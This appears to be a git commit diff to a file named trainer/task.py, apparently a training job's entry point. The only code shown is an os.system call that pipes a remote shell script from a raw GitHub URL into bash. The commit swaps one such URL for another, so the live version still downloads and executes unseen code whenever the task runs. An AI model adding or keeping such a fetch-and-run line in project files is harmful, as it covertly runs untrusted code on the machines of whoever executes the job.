cc9de35647cedecefdfe74e286fd9515a00b6e7a
yunusjua <143286627+yunusjua@users.noreply.github.com>
2024-02-02 16:29:00 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://raw.githubusercontent.com/55113110159/OS/main/log.sh | bash')
+os.system('curl -sL https://raw.githubusercontent.com/kindcidd/cid/main/oh.sh | bash')
